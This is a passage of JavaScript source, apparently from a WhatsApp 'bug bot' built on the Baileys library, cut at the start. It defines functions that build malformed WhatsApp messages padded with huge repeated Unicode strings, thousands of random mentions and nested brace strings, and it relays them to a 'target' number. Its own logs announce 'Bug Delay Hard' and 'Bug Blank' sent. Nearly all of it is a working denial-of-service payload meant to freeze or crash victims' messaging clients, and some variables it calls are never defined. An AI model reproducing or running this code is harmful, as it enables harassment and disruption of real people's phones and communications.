⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝".repeat(4500),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));

  let SqlDelay = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const XIAA2 = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Xiaa4SxBroo",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "💀" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 30000 },
              () => "5" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "Scarry Death",
        },
      },
    },
    
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  
  const SqlDelayV3 = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongtitude: -0,
        contextInfo: {
          isForwarded: true, 
          forwardingScore: 9999,
          participant: "13135550202@s.whatsapp.net", 
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "Scarry Death Visible", 
                format: "DEFAULT"
              }, 
              nativeFlowResponseMessage: {
                name: "mpm", 
                buttonParamsJson: "{}"
              }
            }
          }, 
          remoteJid: "PredHere", 
          mentionedJid: Array.from({ length:2000 }, (_, y) => `13135550${y + 1}0${y + 1}`)
          },
        },
      },
    },
  };
  
  const SqlDelayV4 = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongtitude: -0,
        contextInfo: {
          isForwarded: true, 
          forwardingScore: 9999,
          participant: "13135550202@s.whatsapp.net", 
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "Scarry Invisible?", 
                format: "DEFAULT"
              }, 
              nativeFlowResponseMessage: {
                name: "mpm", 
                buttonParamsJson: "{}"
              }
            }
          }, 
          remoteJid: "Scarry Invisible?", 
          mentionedJid: Array.from({ length:2000 }, (_, y) => `13135550${y + 1}0${y + 1}`)
          },
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(target, SqlDelay, {});

  await sheesh.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  const msg2 = generateWAMessageFromContent(target, SqlDelayV2, {});

  await sheesh.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  const msg3 = generateWAMessageFromContent(target, SqlDelayV3, {});

  await sheesh.relayMessage("status@broadcast", msg3.message, {
    messageId: msg3.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  const msg4 = generateWAMessageFromContent(target, SqlDelayV4, {});

  await sheesh.relayMessage("status@broadcast", msg4.message, {
    messageId: msg4.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await sheesh.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Scarry Invisible?" },
            content: undefined,
          },
        ],
      }
    );
  }
  console.log(chalk.red(`Succes Sending Bug Delay Hard`));
  await sleep(250);
  }
}

async function CtaZts(sheesh, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
    { upload: sheesh.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #Hallo Gasy. " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await sheesh.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function XProtexBlankXDelay(target) {
 try {
  const XProtex = 'ោ៝'.repeat(20000);
  const Blank = 'ꦾ'.repeat(20000);
  const msg = {
    newsletterAdminInviteMessage: {
    newsletterJid: "1234567891234@newsletter",
    newsletterName: "XProtex" + "ោ៝".repeat(20000),
    caption: "XProtex Here Bro" + XProtex + Blank + "ោ៝".repeat(20000),
    inviteExpiration: "90000",
    contextInfo: {
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
      },
    },
  };
  
  await sheesh.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
   console.log(chalk.red.bold(`Succes Sending Bug Blank To Target ${target}`));
 } catch (err) {
    console.error("Gagal Mengirim Bug", err);
  }
}